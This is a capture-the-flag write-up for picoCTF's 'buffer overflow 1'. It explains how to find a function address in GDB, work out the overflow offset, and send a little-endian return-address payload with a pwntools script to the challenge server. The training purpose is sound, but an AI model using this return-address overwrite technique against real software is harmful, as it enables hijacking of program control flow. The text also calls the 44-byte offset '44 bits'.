
# buffer overflow 1

Challenge from picoCTF 2022.



## Challenge description

Control the return address

Additional details will be available after launching your challenge instance.

---
after you run instance:
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln). You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using ```nc saturn.picoctf.net 55429```

## Explained

Download both files. Add permissions to run vuln ```chmod +x vuln```. You can run program. Check the code. You have to enter your string and then there is vuln() function. You can get flag if you will execute win() function. Run program using nc command. Try different inputs. Return adress from vuln() function is not static. You can controll it while overflowing the buffer.

Use GDB to determine adress of the win() function. ```gdb vuln``` then check information about functions using: ```info functions```. There you will find ```0x080491f6  win```. Use Overflow Exploit Pattern Generator then ```run``` program inside gdb, paste pattern as your string.

We can see that crash occures when we the return adress was overwritten with ```"EIP: 0x35624134 ('4Ab5')"```. 4Ab5 is string located on 45-48 inside generated pattern. It means that offest is 44 bits. Generate pattern with length equal 44 and add your 4 characters on the end. Test it using ```run``` again.

We have to replace your 4 characters to HEX adress of win function. Write it in little endian format. Now you have ```Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08```. It's not working correctly when just pasted into ```run``` execution. We have to parse it using stream redirection character. We will also use echo with -ne flag (-n do not output the trailing newline; -e enable interpretation of backslash escapes).

Create flag.txt inside working directory, then run:
```bash
run < <(echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08")
```
Unfortunetly to get flag using network connection we will need another python script. We will use pwn (```pip install pwn```):

```python3
from pwn import *

add = ('saturn.picoctf.net')
soc = remote(add, 58234)

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08"

soc.sendline(payload)

print((soc.recvline()))
print((soc.recv()))
```

You will finally get the flag.


## 🔗 Links
[[https://play.picoctf.org/practice/challenge/258]](https://play.picoctf.org/practice/challenge/258)

